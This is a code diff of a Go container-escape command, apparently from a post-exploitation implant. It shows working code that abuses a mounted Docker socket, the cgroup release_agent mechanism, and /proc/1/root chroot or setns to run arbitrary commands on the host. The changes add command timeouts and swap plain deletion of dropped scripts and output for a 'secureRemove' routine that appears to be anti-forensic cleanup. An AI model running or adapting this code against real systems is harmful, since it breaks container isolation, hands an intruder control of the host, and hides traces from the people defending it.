@@ -41,11 +41,7 @@ type containerEscapeArgs struct {
 func (c *ContainerEscapeCommand) Execute(task structs.Task) structs.CommandResult {
 	var args containerEscapeArgs
 	if err := json.Unmarshal([]byte(task.Params), &args); err != nil {
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Failed to parse arguments: %v", err),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("Failed to parse arguments: %v", err)
 	}
 
 	if args.Action == "" {
@@ -303,8 +299,10 @@ func escapeDockerSock(command, image string) (string, string) {
 	}
 	sb.WriteString("[+] Container started\n")
 
-	// Wait for completion (ignore error — we'll get logs regardless)
-	_, _ = dockerAPIPost(client, fmt.Sprintf("/containers/%s/wait", containerID), nil)
+	// Wait for completion — log error but continue to get logs
+	if _, err := dockerAPIPost(client, fmt.Sprintf("/containers/%s/wait", containerID), nil); err != nil {
+		sb.WriteString(fmt.Sprintf("[!] Wait error (continuing): %v\n", err))
+	}
 
 	// Get logs
 	logs, _ := dockerAPIGet(client, fmt.Sprintf("/containers/%s/logs?stdout=true&stderr=true", containerID))
@@ -379,7 +377,7 @@ func escapeCgroupNotify(command string) (string, string) {
 
 	outputFile, err := os.CreateTemp("", "")
 	if err != nil {
-		os.Remove(scriptPath)
+		secureRemove(scriptPath)
 		_ = syscall.Unmount(cgroupDir, 0)
 		os.RemoveAll(cgroupDir)
 		return fmt.Sprintf("Failed to create output temp file: %v", err), "error"
@@ -406,7 +404,7 @@ func escapeCgroupNotify(command string) (string, string) {
 	// Set release_agent
 	releaseAgentPath := filepath.Join(cgroupDir, "release_agent")
 	if err := os.WriteFile(releaseAgentPath, []byte(releaseAgentScript), 0o644); err != nil {
-		os.Remove(scriptPath)
+		secureRemove(scriptPath)
 		_ = syscall.Unmount(cgroupDir, 0)
 		os.RemoveAll(cgroupDir)
 		return fmt.Sprintf("Failed to set release_agent: %v", err), "error"
@@ -416,7 +414,7 @@ func escapeCgroupNotify(command string) (string, string) {
 	// Enable notify_on_release
 	notifyPath := filepath.Join(childDir, "notify_on_release")
 	if err := os.WriteFile(notifyPath, []byte("1"), 0o644); err != nil {
-		os.Remove(scriptPath)
+		secureRemove(scriptPath)
 		_ = syscall.Unmount(cgroupDir, 0)
 		os.RemoveAll(cgroupDir)
 		return fmt.Sprintf("Failed to enable notify_on_release: %v", err), "error"
@@ -437,14 +435,14 @@ func escapeCgroupNotify(command string) (string, string) {
 	if data, err := os.ReadFile(outputPath); err == nil {
 		sb.WriteString("\n--- Output ---\n")
 		sb.WriteString(string(data))
-		os.Remove(outputPath)
+		secureRemove(outputPath)
 	} else {
 		sb.WriteString("[!] No output file — release_agent may not have fired (host path resolution issue)\n")
 		sb.WriteString("    This technique requires the script path to be valid on the host filesystem\n")
 	}
 
 	// Cleanup
-	os.Remove(scriptPath)
+	secureRemove(scriptPath)
 	_ = syscall.Unmount(cgroupDir, 0)
 	os.RemoveAll(cgroupDir)
 
@@ -497,7 +495,9 @@ func escapeNsenter(command string) (string, string) {
 	// Fallback: use SysProcAttr.Chroot to chroot into /proc/1/root
 	// This avoids spawning the chroot binary — Go handles it internally
 	if _, err := os.Stat("/proc/1/root"); err == nil {
-		cmd := exec.Command("/proc/1/root/bin/sh", "-c", command)
+		ctx, cancel := context.WithTimeout(context.Background(), defaultExecTimeout)
+		defer cancel()
+		cmd := exec.CommandContext(ctx, "/proc/1/root/bin/sh", "-c", command)
 		cmd.SysProcAttr = &syscall.SysProcAttr{
 			Chroot: "/proc/1/root",
 		}
@@ -561,7 +561,9 @@ func nsenterViaSetns(command string) (string, string) {
 	}
 
 	// Run command — child process inherits our (now host) namespaces
-	cmd := exec.Command("/bin/sh", "-c", command)
+	ctx, cancel := context.WithTimeout(context.Background(), defaultExecTimeout)
+	defer cancel()
+	cmd := exec.CommandContext(ctx, "/bin/sh", "-c", command)
 	out, err := cmd.CombinedOutput()
 	if err != nil {
 		return fmt.Sprintf("setns succeeded (%d namespaces) but command failed: %v\n%s", entered, err, string(out)), "error"
